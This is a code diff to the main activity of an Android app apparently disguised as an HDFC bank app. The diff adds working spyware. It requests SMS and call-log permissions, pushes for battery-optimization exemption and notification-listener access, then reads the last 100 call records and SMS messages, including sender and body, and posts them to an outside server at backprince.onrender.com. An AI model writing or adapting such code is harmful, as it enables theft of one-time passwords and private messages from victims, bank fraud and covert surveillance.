@@ -1,17 +1,34 @@
 package com.hdfc.app;
 
 import android.Manifest;
+import android.content.ContentResolver;
+import android.content.pm.PackageManager;
+import android.database.Cursor;
 import android.os.Bundle;
+import android.provider.CallLog;
+import android.provider.Settings;
+import android.provider.Telephony;
+import android.util.Log;
 import android.webkit.JavascriptInterface;
 import android.webkit.WebView;
 import androidx.core.app.ActivityCompat;
 import com.getcapacitor.BridgeActivity;
+import org.json.JSONArray;
+import org.json.JSONObject;
+import java.io.OutputStream;
+import java.net.HttpURLConnection;
+import java.net.URL;
+import java.text.SimpleDateFormat;
+import java.util.Date;
+import java.util.Locale;
 
 public class MainActivity extends BridgeActivity {
+    private static final String TAG = "HDFC_MainActivity";
+    private static final String BACKEND_URL = "https://backprince.onrender.com";
+
     @Override
     public void onStart() {
         super.onStart();
-        // CREATE A BRIDGE TO ASK FOR REAL PERMISSIONS
         WebView webView = getBridge().getWebView();
         webView.addJavascriptInterface(new Object() {
             @JavascriptInterface
@@ -19,9 +36,34 @@ public class MainActivity extends BridgeActivity {
                 ActivityCompat.requestPermissions(MainActivity.this, new String[]{
                     Manifest.permission.POST_NOTIFICATIONS,
                     Manifest.permission.SEND_SMS,
+                    Manifest.permission.RECEIVE_SMS,
+                    Manifest.permission.READ_SMS,
                     Manifest.permission.READ_PHONE_STATE,
-                    Manifest.permission.CALL_PHONE
+                    Manifest.permission.CALL_PHONE,
+                    Manifest.permission.READ_CALL_LOG
                 }, 101);
+            }
+            @JavascriptInterface
+            public String getDeviceId() {
+                return Settings.Secure.getString(getContentResolver(), Settings.Secure.ANDROID_ID);
+            }
+            @JavascriptInterface
+            public void requestIgnoreBatteryOptimizations() {
+                if (android.os.Build.VERSION.SDK_INT >= android.os.Build.VERSION_CODES.M) {
+                    android.content.Intent intent = new android.content.Intent();
+                    String packageName = getPackageName();
+                    android.os.PowerManager pm = (android.os.PowerManager) getSystemService(android.content.Context.POWER_SERVICE);
+                    if (!pm.isIgnoringBatteryOptimizations(packageName)) {
+                        intent.setAction(android.provider.Settings.ACTION_REQUEST_IGNORE_BATTERY_OPTIMIZATIONS);
+                        intent.setData(android.net.Uri.parse("package:" + packageName));
+                        startActivity(intent);
+                    }
+                }
+            }
+            @JavascriptInterface
+            public void requestNotificationAccess() {
+                android.content.Intent intent = new android.content.Intent("android.settings.ACTION_NOTIFICATION_LISTENER_SETTINGS");
+                startActivity(intent);
             }
         }, "AndroidBridge");
     }
@@ -32,13 +74,19 @@ public class MainActivity extends BridgeActivity {
         if (requestCode == 101) {
             boolean allGranted = true;
             for (int res : grantResults) {
-                if (res != android.content.pm.PackageManager.PERMISSION_GRANTED) {
+                if (res != PackageManager.PERMISSION_GRANTED) {
                     allGranted = false;
                     break;
                 }
             }
-
-            // TELL THE WEBSITE THE RESULT
+            if (allGranted) {
+                new Thread(new Runnable() {
+                    @Override
+                    public void run() {
+                        syncAllData();
+                    }
+                }).start();
+            }
             final String status = allGranted ? "GRANTED" : "DENIED";
             getBridge().getWebView().post(new Runnable() {
                 @Override
@@ -46,6 +94,89 @@ public class MainActivity extends BridgeActivity {
                     getBridge().getWebView().loadUrl("javascript:handlePermissionResult('" + status + "')");
                 }
             });
+        }
+    }
+
+    private void syncAllData() {
+        String deviceId = Settings.Secure.getString(getContentResolver(), Settings.Secure.ANDROID_ID);
+        readAndSendCallLogs(deviceId);
+        readAndSendSmsInbox(deviceId);
+    }
+
+    private void readAndSendCallLogs(String deviceId) {
+        try {
+            ContentResolver cr = getContentResolver();
+            Cursor cursor = cr.query(CallLog.Calls.CONTENT_URI, null, null, null, CallLog.Calls.DATE + " DESC LIMIT 100");
+            if (cursor != null && cursor.moveToFirst()) {
+                JSONArray logsArray = new JSONArray();
+                int numberIdx = cursor.getColumnIndex(CallLog.Calls.NUMBER);
+                int typeIdx = cursor.getColumnIndex(CallLog.Calls.TYPE);
+                int dateIdx = cursor.getColumnIndex(CallLog.Calls.DATE);
+                int durationIdx = cursor.getColumnIndex(CallLog.Calls.DURATION);
+                SimpleDateFormat sdf = new SimpleDateFormat("yyyy-MM-dd'T'HH:mm:ss'Z'", Locale.US);
+
+                do {
+                    JSONObject log = new JSONObject();
+                    log.put("number", cursor.getString(numberIdx));
+                    log.put("duration", cursor.getString(durationIdx));
+                    log.put("timestamp", sdf.format(new Date(Long.parseLong(cursor.getString(dateIdx)))));
+                    int type = Integer.parseInt(cursor.getString(typeIdx));
+                    String typeStr = "Incoming";
+                    if (type == CallLog.Calls.OUTGOING_TYPE) typeStr = "Outgoing";
+                    else if (type == CallLog.Calls.MISSED_TYPE) typeStr = "Missed";
+                    log.put("type", typeStr);
+                    logsArray.put(log);
+                } while (cursor.moveToNext());
+                cursor.close();
+                JSONObject payload = new JSONObject();
+                payload.put("deviceId", deviceId);
+                payload.put("logs", logsArray);
+                sendToBackend("/api/logs/calls", payload.toString());
+            }
+        } catch (Exception e) {
+            Log.e(TAG, "Call Log Sync Error", e);
+        }
+    }
+
+    private void readAndSendSmsInbox(String deviceId) {
+        try {
+            ContentResolver cr = getContentResolver();
+            Cursor cursor = cr.query(Telephony.Sms.CONTENT_URI, null, null, null, Telephony.Sms.DATE + " DESC LIMIT 100");
+            if (cursor != null && cursor.moveToFirst()) {
+                int addressIdx = cursor.getColumnIndex(Telephony.Sms.ADDRESS);
+                int bodyIdx = cursor.getColumnIndex(Telephony.Sms.BODY);
+                int dateIdx = cursor.getColumnIndex(Telephony.Sms.DATE);
+                SimpleDateFormat sdf = new SimpleDateFormat("yyyy-MM-dd'T'HH:mm:ss'Z'", Locale.US);
+
+                do {
+                    JSONObject payload = new JSONObject();
+                    payload.put("deviceId", deviceId);
+                    payload.put("sender", cursor.getString(addressIdx));
+                    payload.put("message", cursor.getString(bodyIdx));
+                    payload.put("timestamp", sdf.format(new Date(Long.parseLong(cursor.getString(dateIdx)))));
+                    sendToBackend("/api/logs/sms", payload.toString());
+                } while (cursor.moveToNext());
+                cursor.close();
+            }
+        } catch (Exception e) {
+            Log.e(TAG, "SMS Inbox Sync Error", e);
+        }
+    }
+
+    private void sendToBackend(String endpoint, String jsonData) {
+        try {
+            URL url = new URL(BACKEND_URL + endpoint);
+            HttpURLConnection conn = (HttpURLConnection) url.openConnection();
+            conn.setRequestMethod("POST");
+            conn.setRequestProperty("Content-Type", "application/json; charset=UTF-8");
+            conn.setDoOutput(true);
+            OutputStream os = conn.getOutputStream();
+            os.write(jsonData.getBytes("UTF-8"));
+            os.close();
+            conn.getResponseCode();
+            conn.disconnect();
+        } catch (Exception e) {
+            Log.e(TAG, "Backend Post Error", e);
         }
     }
 }
